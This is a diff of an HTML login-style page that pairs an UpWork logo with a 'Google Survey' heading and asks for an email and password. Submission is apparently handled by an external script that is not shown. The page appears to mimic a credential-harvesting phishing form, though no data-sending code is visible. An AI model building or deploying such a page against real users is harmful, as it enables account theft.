@@ -3,89 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>UpWork- Ranjitha Ranganath</title>
+    <title>UpWork - Ranjitha Ranganath</title>
     <style>
-        /* Use Flexbox to center content horizontally and vertically */
         body, html {
-            height: 100%; /* Ensure full height of the page */
-            margin: 0; /* Remove default margin */
-            display: flex; /* Enable Flexbox */
-            justify-content: center; /* Align items horizontally in the center */
-            align-items: center; /* Align items vertically in the center */
-            font-family: Arial, sans-serif; /* Set font family */
+            height: 100%;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: Arial, sans-serif;
         }
         
         .container {
-            text-align: center; /* Center the text */
+            text-align: center;
             padding: 20px;
-            border: 1px solid #ddd; /* Optional: border for the form */
-            border-radius: 8px; /* Optional: rounded corners */
-            background-color: #f4f4f4; /* Light background color */
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background-color: #f4f4f4;
         }
 
         form {
-            display: inline-block; /* Make the form inline block to control width */
-            text-align: left; /* Align text inside the form */
+            display: inline-block;
+            text-align: left;
         }
 
         label, input {
-            display: block; /* Make the label and input elements block-level */
-            margin: 10px 0; /* Add margin for spacing */
+            display: block;
+            margin: 10px 0;
         }
 
         input {
-            width: 100%; /* Make inputs fill the width */
-            padding: 10px; /* Add padding inside inputs */
-            box-sizing: border-box; /* Ensure padding doesn't affect width */
-            border: 1px solid #ccc; /* Border for inputs */
-            border-radius: 4px; /* Rounded corners for inputs */
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
         }
 
         button {
             padding: 10px 20px;
-            background-color: #4CAF50; /* Green background */
+            background-color: #4CAF50;
             color: white;
             border: none;
-            border-radius: 4px; /* Rounded corners */
+            border-radius: 4px;
             cursor: pointer;
-            width: 100%; /* Make button fill the width */
+            width: 100%;
         }
 
         button:hover {
-            background-color: #45a049; /* Darker green on hover */
+            background-color: #45a049;
+        }
+
+        .label-icon {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .label-icon i {
+            font-size: 16px;
+            color: #666;
         }
     </style>
+    <!-- Add FontAwesome for icons -->
+    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
 </head>
 <body>
     <div class="container">
-<img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
+        <img src="upwork.png" alt="UpWork Logo" style="width: 150px; height: auto;">
         <h1>Google Survey</h1>
-        <!-- Logo -->
-       
 
-        <!-- Form -->
-
-
-              <form action="">
+        <form id="userForm">
             <label for="email">Email</label>
             <input type="text" id="email" name="email" required>
             
-
-            <label for="password">Password</label>
+            <div class="label-icon">
+                <label for="password">Password</label>
+                <i class="fas fa-key"></i>
+            </div>
             <input type="password" id="password" name="password" required>
             
-
             <button type="submit">Sign in</button>
         </form>
     </div>
-    <!-- Modal HTML -->
-<div id="myModal" class="modal">
-  <div class="modal-content">
-    <span class="close">&times;</span>
-    <p id="modalMessage"></p>
-  </div>
-</div>
-    <script src="index.js">
-</script>
+
+    <script src="index.js"></script>
 </body>
 </html>
